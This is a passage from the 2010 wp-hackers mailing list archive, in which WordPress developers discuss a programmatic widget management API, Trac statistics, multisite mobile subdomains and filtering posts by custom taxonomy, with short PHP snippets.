Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Oct 20, 2010 at 7:59 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Oct 20, 2010 at 10:23 AM, John Blackbourn
> <johnbillion+wp at gmail.com <johnbillion%2Bwp at gmail.com><
> johnbillion%2Bwp at gmail.com <johnbillion%252Bwp at gmail.com>>
> > wrote:
>
> > On Wed, Oct 20, 2010 at 1:26 PM, Rich ZenMaster <richzenmaster at gmail.com
> >
> > wrote:
> > > Actually I don't need the list of posts. Just the post count.
> >
> > If you fetch the posts using get_posts() as Andrew suggested you can
> > then count() them to get the total. The added bonus will be that the
> > posts are added to WordPress' object cache.
>
>
> Especially important if you then need to display these posts.
>
> If you use WP_Query directly, you can use $my_query->post_count.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ashishsainiashfame at gmail.com  Wed Oct 20 15:52:32 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 20 Oct 2010 21:22:32 +0530
Subject: [wp-hackers] making shortcodes work in theme options
In-Reply-To: <AANLkTik71WJZeNmNTYMmY92TH07tvUY5t=GnHSDOENE6@mail.gmail.com>
References: <AANLkTik71WJZeNmNTYMmY92TH07tvUY5t=GnHSDOENE6@mail.gmail.com>
Message-ID: <AANLkTinUhDVZ=3tYc4tP9aTs46-DrtNjVoOg9y_qz+UG@mail.gmail.com>

Take a look here -
http://codex.wordpress.org/Function_Reference/do_shortcode

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Wed, Oct 20, 2010 at 5:23 PM, Rich ZenMaster <richzenmaster at gmail.com>wrote:

> Is it possible to make the shortcodes work in theme options?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Wed Oct 20 15:54:13 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 20 Oct 2010 16:54:13 +0100
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
	<94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
	<AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>
Message-ID: <BD8594D9-7C5E-463D-BA3C-F32993972BC8@ftwr.co.uk>


On 20 Oct 2010, at 16:48, Jeremy Clarke wrote:

> On Tue, Oct 19, 2010 at 5:04 AM, Peter Westwood
> <peter.westwood at ftwr.co.uk>wrote:
> 
>> It sounds like what you need is a comprehensive widget management api!
>> 
>> The best way to get this is to work through the current widget code in
>> wp-admin/widgets.php and try and abstract it out into an api which that code
>> can use and your plugin can use.
>> 
>> Submit this as a core patch and once it is included you will have an api to
>> base your plugin on.
>> 
>> 
> +1
> 
> WP needs this badly. Among other automation-related uses it would be great
> if themes could define initial widgets for their widget zones in
> functions.php rather than having hard-coded alternate content (which
> confuses users who go to Appearance > Widgets and see nothing there to
> explain what's already visible on the site).

Yes please!

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From mail at scribu.net  Wed Oct 20 16:48:15 2010
From: mail at scribu.net (scribu)
Date: Wed, 20 Oct 2010 19:48:15 +0300
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
	<94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
	<AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>
Message-ID: <AANLkTin3-LBPCoTeFAcnB3ypwgtY4XxdR2wLNnjgT-Wq@mail.gmail.com>

On Wed, Oct 20, 2010 at 6:48 PM, Jeremy Clarke <jer at simianuprising.com>wrote:

> WP needs this badly. Among other automation-related uses it would be great
> if themes could define initial widgets for their widget zones in
> functions.php rather than having hard-coded alternate content (which
> confuses users who go to Appearance > Widgets and see nothing there to
> explain what's already visible on the site).
>

Doesn't twentyten already do this?

From emoya at tribune.com  Wed Oct 20 16:52:56 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Wed, 20 Oct 2010 11:52:56 -0500
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <BD8594D9-7C5E-463D-BA3C-F32993972BC8@ftwr.co.uk>
Message-ID: <C8E48898.CE60%emoya@tribune.com>

Interesting this coming up now. Recently I "finished" writing a plugin that adds a control mechanism to widget, much like we handle plugins. I wouldn't call it complete (and there is no actual GUI yet) - but its sufficient at the moment to allow us to easily modify active and inactive widgets for the various environments we have.

With it, I can currently create default settings. A list of widgets which the plugin automatically takes control of and can immediately have them enabled or disabled.

I have it setup so that a widget that isnt in the defaults needs to be "registered" with the plugin. The plugin then takes control of the widget in terms of its registration with the core widget API.

$widget_pack->add_widget("My_Widget");
/*this will also look trigger __autoload to inteligently
search for the plugin file if its not locally available in the plugins custom directory */

Add_widget comes with optional flags that allow the widget to be immediately enabled, and to pass custom paths. Once the plugin has control over the widget, its a simple step to have that widget enabled/disabled (activated/deactivated). It also includes an ability to "delete" the widget - although this only actually removes it from the list of widgets the plugin is controlling.

$widget_pack->enable_widget("My_Widget");
$widget_pack->disable_widget("My_Widget");
$widget_pack->delete_widget("My_Widget");

And of course...

$widget_pack->reset_defaults(); // for those "oops's"

As mentioned above, there is also has a special directory where the plugin will take control over any widget in that directory. (something like how the plugins are automatically detected by wp), although the use of that is limited since that part is a bit buggy.

Beyond building a much needed interface for it (possibly modeled partially after the plugin page) - my next step was going to be setting up more granulated controls to allow for permission settings. So only certain roles or capabilities could have access to certain widgets (for example, the oft misused "Text Widget"). However I ran into siginificant difficulty in figuring out how to have a widget turned on, but not show in the widget page AND still show up on the page if it was set up by a different user - so I just kind of scrapped that.

Really at the moment its just an api, and a simple one at that. Not exactly what was brought up, but its germane in that there is a lot lacking in terms of configuring widgets - and certainly these are some basic control features I think wordpress  widgets needs to have.


--
Eddie Moya
Applications Developer
Tribune Technology


On 10/20/10 10:54 AM, "Peter Westwood" <peter.westwood at ftwr.co.uk> wrote:



On 20 Oct 2010, at 16:48, Jeremy Clarke wrote:

> On Tue, Oct 19, 2010 at 5:04 AM, Peter Westwood
> <peter.westwood at ftwr.co.uk>wrote:
>
>> It sounds like what you need is a comprehensive widget management api!
>>
>> The best way to get this is to work through the current widget code in
>> wp-admin/widgets.php and try and abstract it out into an api which that code
>> can use and your plugin can use.
>>
>> Submit this as a core patch and once it is included you will have an api to
>> base your plugin on.
>>
>>
> +1
>
> WP needs this badly. Among other automation-related uses it would be great
> if themes could define initial widgets for their widget zones in
> functions.php rather than having hard-coded alternate content (which
> confuses users who go to Appearance > Widgets and see nothing there to
> explain what's already visible on the site).

Yes please!

--
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From peter.westwood at ftwr.co.uk  Wed Oct 20 17:01:21 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 20 Oct 2010 18:01:21 +0100
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <AANLkTin3-LBPCoTeFAcnB3ypwgtY4XxdR2wLNnjgT-Wq@mail.gmail.com>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
	<94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
	<AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>
	<AANLkTin3-LBPCoTeFAcnB3ypwgtY4XxdR2wLNnjgT-Wq@mail.gmail.com>
Message-ID: <E9339288-C452-48C4-961E-23BEBC3D1C58@ftwr.co.uk>


On 20 Oct 2010, at 17:48, scribu wrote:

> On Wed, Oct 20, 2010 at 6:48 PM, Jeremy Clarke <jer at simianuprising.com>wrote:
> 
>> WP needs this badly. Among other automation-related uses it would be great
>> if themes could define initial widgets for their widget zones in
>> functions.php rather than having hard-coded alternate content (which
>> confuses users who go to Appearance > Widgets and see nothing there to
>> explain what's already visible on the site).
>> 
> 
> Doesn't twentyten already do this?

Not as far as I know - we haven't got an api which makes it easy.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From wordpress at santosj.name  Wed Oct 20 17:19:35 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Wed, 20 Oct 2010 12:19:35 -0500
Subject: [wp-hackers] Statistics Based on WordPress Trac
Message-ID: <AANLkTinxkr-fnJLoUkmetyMmiYKUAQ3yV2Yv2Cc9EpWu@mail.gmail.com>

I developed a basic HTML scrapper for WordPress Trac and I'm wanting to go
through and do some graphs. Is there anything anyone would want to know
before I release my own observations?

What I'm working on:

1. Number of Attachments based on username [1].
2. Average size of Attachments for each username.
3. Number of people who have more than 100 attachments verses those that
only have less than 10.
4. Number of Patches based on username [1].
5. Time between last patch and the commit of patch (will only consider
initial patch and commit, patches after the first commit will not be
considered).
6. Number of patches for those with 25+ patches between different time
periods (quarters).

It took about 9 hours to scrap the 15k tickets, but now that I know which
tickets have attachments, it should be faster to do some of the more
involved tasks.

Jacob Santos

[1] Attachments are the raw files that were uploaded by the username, so it
includes pictures, compressed files, php files, etc as well as patches and
diff files. Patches will only include files that are .patch or .diff.

From kyounger at gmail.com  Wed Oct 20 17:33:35 2010
From: kyounger at gmail.com (Kenneth Younger)
Date: Wed, 20 Oct 2010 12:33:35 -0500
Subject: [wp-hackers] Statistics Based on WordPress Trac
In-Reply-To: <AANLkTinxkr-fnJLoUkmetyMmiYKUAQ3yV2Yv2Cc9EpWu@mail.gmail.com>
References: <AANLkTinxkr-fnJLoUkmetyMmiYKUAQ3yV2Yv2Cc9EpWu@mail.gmail.com>
Message-ID: <AANLkTikrKp+jpYykNH7mVWCpuo2Y88xT3YsBQiez+m4K@mail.gmail.com>

On Wed, Oct 20, 2010 at 12:19 PM, Jacob Santos <wordpress at santosj.name>wrote:

> I developed a basic HTML scrapper for WordPress Trac and I'm wanting to go
> through and do some graphs. Is there anything anyone would want to know
> before I release my own observations?
>
> What I'm working on:
>
> 1. Number of Attachments based on username [1].
> 2. Average size of Attachments for each username.
> 3. Number of people who have more than 100 attachments verses those that
> only have less than 10.
> 4. Number of Patches based on username [1].
> 5. Time between last patch and the commit of patch (will only consider
> initial patch and commit, patches after the first commit will not be
> considered).
> 6. Number of patches for those with 25+ patches between different time
> periods (quarters).
>
> It took about 9 hours to scrap the 15k tickets, but now that I know which
> tickets have attachments, it should be faster to do some of the more
> involved tasks.
>
> Jacob Santos
>
> [1] Attachments are the raw files that were uploaded by the username, so it
> includes pictures, compressed files, php files, etc as well as patches and
> diff files. Patches will only include files that are .patch or .diff.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


Breaking all of the metrics down by component would be interesting as well.

-Kenny

From bulk at thecodecave.com  Wed Oct 20 17:36:46 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Wed, 20 Oct 2010 13:36:46 -0400
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <C8E48898.CE60%emoya@tribune.com>
References: <BD8594D9-7C5E-463D-BA3C-F32993972BC8@ftwr.co.uk>
	<C8E48898.CE60%emoya@tribune.com>
Message-ID: <005501cb707d$5e9b4c90$1bd1e5b0$@thecodecave.com>

 Eddie Moya wrote:
> $widget_pack->add_widget("My_Widget");

Ooo that sounds interesting.. 

I don't see the specification of which sidebar the widgets are going into in
your examples, but do you have that and the ability to set the position of
the widget within the sidebar? I agree; it would be great to have a simple
API for all this..

Brian Layman 
http://eHermitsInc.com
 






From emoya at tribune.com  Wed Oct 20 18:02:30 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Wed, 20 Oct 2010 13:02:30 -0500
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <005501cb707d$5e9b4c90$1bd1e5b0$@thecodecave.com>
Message-ID: <C8E498E6.CE74%emoya@tribune.com>

No, I don't have that. But I did forget to mention when I talked about future additions. However, I don't think I would be making it work the way you seem to be describing.

An issue we have run into is attempting to constrain what sidebars a widget can be used in. For example, for the Candidate Blogs network I was asked to build this big blue box above the main content with some brief candidate details. The big problem I didn't want a bunch of support tickets coming in because someone stuck it in the right rail.

example: http://candidateblogs.sun-sentinel.com/steve-edmonds/

My hacked solution was to use a whole bunch of css hacks to enforce the limitation.

We need to have this sort of constraint available. This I think I can do. In fact I only have not added it because other priorities have taken up my time. I am fairly certain that creating a way of having logic where it only loads in a sidebar named "sidebar1" for example. I think the quick (less elegant) solution will be to let users add the widget to whatever sidebar they want, but simply have that widget not work if the constraint is not met.


--
Eddie Moya
Applications Developer
Tribune Technology


On 10/20/10 12:36 PM, "Brian Layman" <bulk at thecodecave.com> wrote:

Eddie Moya wrote:
> $widget_pack->add_widget("My_Widget");

Ooo that sounds interesting..

I don't see the specification of which sidebar the widgets are going into in
your examples, but do you have that and the ability to set the position of
the widget within the sidebar? I agree; it would be great to have a simple
API for all this..

Brian Layman
http://eHermitsInc.com






_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From jer at simianuprising.com  Wed Oct 20 18:08:53 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 20 Oct 2010 14:08:53 -0400
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <C8E498E6.CE74%emoya@tribune.com>
References: <005501cb707d$5e9b4c90$1bd1e5b0$@thecodecave.com>
	<C8E498E6.CE74%emoya@tribune.com>
Message-ID: <AANLkTinMoLvNdVSZ8XmXc11Ns47ypt29KOU3_wV+bv-x@mail.gmail.com>

On Wed, Oct 20, 2010 at 2:02 PM, Moya, Eddie <emoya at tribune.com> wrote:

>
> We need to have this sort of constraint available. This I think I can do.
> In fact I only have not added it because other priorities have taken up my
> time. I am fairly certain that creating a way of having logic where it only
> loads in a sidebar named "sidebar1" for example. I think the quick (less
> elegant) solution will be to let users add the widget to whatever sidebar
> they want, but simply have that widget not work if the constraint is not
> met.
>
>
FWIW I think the use-case you're dealing with is probably outside the scope
of the much more general API that should be in core. Limiting what widgets
can go in what sidebar may also be a use-case the API should handle, but
that would probably do better to be part of the register_sidebar() end of
things rather than the suite of functions that would allow adding of widgets
into sidebars with PHP (other features that would be nice in
register_sidebar() would be limits on the number of widgets that can go in
and the ability to randomize their order).

Obviously you are adding widgets programmatically for some reason, so even
if this theoretical new API didn't account for your constraints, it would
let you focus only on those parts of your problem rather than having it all
mixed together in your workaround class.

Jeremy Clarke | http://jeremyclarke.org

From emoya at tribune.com  Wed Oct 20 18:33:45 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Wed, 20 Oct 2010 13:33:45 -0500
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <AANLkTinMoLvNdVSZ8XmXc11Ns47ypt29KOU3_wV+bv-x@mail.gmail.com>
Message-ID: <C8E4A039.CE83%emoya@tribune.com>

Seems you may have misunderstood what "add_widget" does in my plugin. It does not add the widget to a sidebar (although such an additional feature would be very simple to add, I think) - rather in merely adds it to the internal list of widgets under the control of the plugin.

The benefit for us in this regard, is that we don't have to change which widgets are in our source control depending on which environment we are releasing to. The specific reason I just explained -sure- is not the most common, however the general ability to make a widget activate and deactivate, including the built in default widgets seems to a fairly basic and generic feature.

Of course, if something like the functions I have created would be added to the existing API, they probably wouldn't need to be configured the same way  - it may or may not even need an equivalent of add_widget if this were in core. The reason for the way it works now, is because for my to able to independently turn on and off a widget, without removing the code and without necessarily deactivating plugins (not to mention the default widgets), I need to take over control of the widget registration process. That's exactly what I do. If I were to do this by modifying core I would do it much differently. If there were interest in having this added to core, I would start changing directions and think about it that way

In regard to limiting widgets to specific sidebars, I agree that its probably best if it were something that was part of the register_sidebar() function. I wont be doing it that way however, since I am not patching core, I am writing a plugin to do what core doesn't. So much in the same way I might incorporate the constraint into register_sidebar, I will have to incorporate it into add_widget() (which functions as the register_widget for my widget control plugin.

Simple control features I think widgets need.

 1.  Activate/Deactivate, similar to the way you can with plugins
 2.  Constraints. Ability to limit a widget to work on certain  sidebars, both inclusive and exclusive logic.
 3.  Role/Capability-based access using/modifying widgets. (Possibly equally as needed, but probably more difficult to implement)

For number 3, obviously widget developers can create there widgets with capability-based conditions in place - but whats really needed is for the users of any widget to be able to say certain widgets are off-limits to certain users.


--
Eddie Moya
Applications Developer
Tribune Technology


On 10/20/10 1:08 PM, "Jeremy Clarke" <jer at simianuprising.com> wrote:

On Wed, Oct 20, 2010 at 2:02 PM, Moya, Eddie <emoya at tribune.com> wrote:

>
> We need to have this sort of constraint available. This I think I can do.
> In fact I only have not added it because other priorities have taken up my
> time. I am fairly certain that creating a way of having logic where it only
> loads in a sidebar named "sidebar1" for example. I think the quick (less
> elegant) solution will be to let users add the widget to whatever sidebar
> they want, but simply have that widget not work if the constraint is not
> met.
>
>
FWIW I think the use-case you're dealing with is probably outside the scope
of the much more general API that should be in core. Limiting what widgets
can go in what sidebar may also be a use-case the API should handle, but
that would probably do better to be part of the register_sidebar() end of
things rather than the suite of functions that would allow adding of widgets
into sidebars with PHP (other features that would be nice in
register_sidebar() would be limits on the number of widgets that can go in
and the ability to randomize their order).

Obviously you are adding widgets programmatically for some reason, so even
if this theoretical new API didn't account for your constraints, it would
let you focus only on those parts of your problem rather than having it all
mixed together in your workaround class.

Jeremy Clarke | http://jeremyclarke.org
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From jer at simianuprising.com  Wed Oct 20 19:06:00 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 20 Oct 2010 15:06:00 -0400
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <C8E4A039.CE83%emoya@tribune.com>
References: <AANLkTinMoLvNdVSZ8XmXc11Ns47ypt29KOU3_wV+bv-x@mail.gmail.com>
	<C8E4A039.CE83%emoya@tribune.com>
Message-ID: <AANLkTikc-ti_Us5wiX8mNz_7mJL4nWGe0VBdqnQv9rM3@mail.gmail.com>

On Wed, Oct 20, 2010 at 2:33 PM, Moya, Eddie <emoya at tribune.com> wrote:

>  1.  Activate/Deactivate, similar to the way you can with plugins
>


I might have been confused because that is something that is easy to do with
the existing api:

function custom_widgets_init() {

    // Uncomment these two lines for output of default widgets
    //global $wp_widget_factory;
    //print_r($wp_widget_factory);

    // Unregister the default recent comments widget
    unregister_widget('WP_Widget_Recent_Comments');

    // Register our better version
    register_widget('WP_Widget_custom_recent_comments');
}
add_action('widgets_init', 'custom_widgets_init');

I'm pretty sure that unregister_widget() will even fail gracefully if the
widget in question wasn't registered, meaning you can unregister plugin
widgets without worrying about whether the plugin is installed on the
current site.


 3.  Role/Capability-based access using/modifying widgets. (Possibly equally
> as needed, but probably more difficult to implement)
>

For number 3, obviously widget developers can create there widgets with
> capability-based conditions in place - but whats really needed is for the
> users of any widget to be able to say certain widgets are off-limits to
> certain users.
>
>
If someone can edit a sidebar then having widgets that they can't edit will
mean there are parts of the sidebar that they can't change. This seems
pretty user-unfriendly to me, and I don't even want to start thinking
through all the logic you'd need to handle to make it work well. I'd tend to
think that you should instead limit Widgets/Sidebars access to those you can
trust with the content of the sidebar.

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From rbilesky at gmail.com  Wed Oct 20 19:29:26 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 20 Oct 2010 12:29:26 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
	<A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>
Message-ID: <AANLkTin8KEAcmoMrid2-Q1-zTC9Tg0N=b7jPqzXOog3n@mail.gmail.com>

I do have a plugin on my main blog that is supposed to detect mobile
user-agents or the use of the m.mysite.com domain and switch to a mobile
theme.  I'm just not sure how I can make m.mysite.com access
mysite.comwithout redircting it, thus loosing the m subdomain that
would kick in the
mobile theme.

On Wed, Oct 20, 2010 at 4:25 AM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

>
> On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:
>
> > I've tried this before and it's difficult with multi-site set up.
> >
> > I guess the question is, how do we 'jump in' before WordPress serves up
> the
> > registration page at m.example.com and instead serve up example.com with
> a
> > different theme?
> >
> > Because, once we set up subdomain wildcards, WP is running the show then?
> >
> >
>
> I guess the answer would be to put some code in sunrise.php to make WP
> believe that the current blog is the one you want it to in this case and
> make it use the right theme
>
> Cheers
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From emoya at tribune.com  Wed Oct 20 19:50:29 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Wed, 20 Oct 2010 14:50:29 -0500
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <AANLkTikc-ti_Us5wiX8mNz_7mJL4nWGe0VBdqnQv9rM3@mail.gmail.com>
Message-ID: <C8E4B235.CE9D%emoya@tribune.com>


On 10/20/10 2:06 PM, "Jeremy Clarke" <jer at simianuprising.com> wrote:

I might have been confused because that is something that is easy to do with
the existing api:

Thing is, as I said, what I have is basically a really simple api, what is needed is an interface. So that this can b done without needing to write a new custom_widgets_init each time, and without hardcoding widget names. Of course, since what I have does not have a GUI yet, yes it basically mimics part of what your describing. The intent has always been to add an interface to this though that has no hard-coded widget names.



If someone can edit a sidebar then having widgets that they can't edit will
mean there are parts of the sidebar that they can't change. This seems
pretty user-unfriendly to me, and I don't even want to start thinking
through all the logic you'd need to handle to make it work well.

Agreed, the logical mayhem I ran into just trying to come up with a plan of action for this is the reason I "scrapped it" as I said before. Still, it seems that some way of limiting access to a widgets based on users capabilities would be a very valuable addition. The way this might be handled or accomplished is obviously up in the air. Nonetheless, its not a leap of crazy logic to say that it would be useful to have users with ABC capability be able to edit Sidebar_X, but not have access to Some_Important_Widget, while still giving that access to certain other users.

As far as it not being user-friendly, that all depends on presentation of course and making sure there isnt unexpected background behavior going on. I envision a locked widget might just be permanently collapsed, undraggable, and have a little padlock on it to indicate its been locked. Easier said than done though.



I'd tend to think that you should instead limit Widgets/Sidebars access to those you can
trust with the content of the sidebar.

Are you saying there is a way to do this already? If not an alternative to the aforementioned - this would be a great feature  of its own. Something like this combined with what I listed as #2 - the ability to add contraints to a widget in terms of which sidebars it can/cant be used with - might together solve some of what is needed for #3. However, this would not be ideal, since it would leave the entire affair dependant on the number of sidebars built into a theme - rather than just giving admins the ability to control access to widgets directly.


--
Eddie Moya
Applications Developer
Tribune Technology




From dvmorris at gmail.com  Wed Oct 20 22:49:04 2010
From: dvmorris at gmail.com (David Morris)
Date: Wed, 20 Oct 2010 17:49:04 -0500
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term assignment
Message-ID: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>

I have a custom taxonomy called 'test', and I want to filter the main loop
to show only posts that are tagged with the term 'test_term'.

I tried using the 'pre_get_posts' and the 'request' filters, and it doesn't
seem to be working.

Thanks for your help,
Dave

From mail at scribu.net  Thu Oct 21 00:11:26 2010
From: mail at scribu.net (scribu)
Date: Thu, 21 Oct 2010 03:11:26 +0300
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
Message-ID: <AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>

On Thu, Oct 21, 2010 at 1:49 AM, David Morris <dvmorris at gmail.com> wrote:

> I have a custom taxonomy called 'test', and I want to filter the main loop
> to show only posts that are tagged with the term 'test_term'.
>
> I tried using the 'pre_get_posts' and the 'request' filters, and it doesn't
> seem to be working.


Show us the code.

From dvmorris at gmail.com  Thu Oct 21 00:31:43 2010
From: dvmorris at gmail.com (David Morris)
Date: Wed, 20 Oct 2010 19:31:43 -0500
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
	<AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
Message-ID: <AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>

//in functions.php

add_action( 'pre_get_posts', 'test_pre_get_posts' );
function test_pre_get_posts( $query ) {
$query->set('taxonomy','test');
 $query->set('term','test_term');
 return $query;
}

// and for the loop-index.php file in the theme:

<?php  while ( have_posts() ) : the_post(); ?>
...
<?php endwhile; ?>

From mail at scribu.net  Thu Oct 21 00:46:23 2010
From: mail at scribu.net (scribu)
Date: Thu, 21 Oct 2010 03:46:23 +0300
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
	<AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
	<AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>
Message-ID: <AANLkTi=1icK9oumRS_11drLzqak+uU71-jp+afeQDfRP@mail.gmail.com>

On Thu, Oct 21, 2010 at 3:31 AM, David Morris <dvmorris at gmail.com> wrote:

> //in functions.php
>
> add_action( 'pre_get_posts', 'test_pre_get_posts' );
> function test_pre_get_posts( $query ) {
> $query->set('taxonomy','test');
>  $query->set('term','test_term');
>  return $query;
> }
>

Try this instead:

function test_pre_get_posts( $query ) {
  $query->set('test', 'test_term');
}

From dvmorris at gmail.com  Thu Oct 21 00:57:27 2010
From: dvmorris at gmail.com (David Morris)
Date: Wed, 20 Oct 2010 19:57:27 -0500
Subject: [wp-hackers] Filtering a loop by a custom taxonomy term
	assignment
In-Reply-To: <AANLkTi=1icK9oumRS_11drLzqak+uU71-jp+afeQDfRP@mail.gmail.com>
References: <AANLkTinORFVzOzXpvPypOy+p1wQ59Dw1q_MfHfTnQ-+O@mail.gmail.com>
	<AANLkTi=rGb4Gm8ayBq+AXv8aia2Uj+BsnEJ1poWavFB8@mail.gmail.com>
	<AANLkTikLmhB+nRns2WyajsTVANtZSke8XXspoYp0QeGn@mail.gmail.com>
	<AANLkTi=1icK9oumRS_11drLzqak+uU71-jp+afeQDfRP@mail.gmail.com>
Message-ID: <AANLkTimHgMh8zwg0OrN-dUfmyN+6BY95EFPF_FzwFHEa@mail.gmail.com>

That doesn't seem to work for me.

On Wed, Oct 20, 2010 at 7:46 PM, scribu <mail at scribu.net> wrote:

> On Thu, Oct 21, 2010 at 3:31 AM, David Morris <dvmorris at gmail.com> wrote:
>
> > //in functions.php
> >
> > add_action( 'pre_get_posts', 'test_pre_get_posts' );
> > function test_pre_get_posts( $query ) {
> > $query->set('taxonomy','test');
> >  $query->set('term','test_term');
> >  return $query;
> > }
> >
>
> Try this instead:
>
> function test_pre_get_posts( $query ) {
>   $query->set('test', 'test_term');
> }
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From rbilesky at gmail.com  Thu Oct 21 01:12:10 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Wed, 20 Oct 2010 18:12:10 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
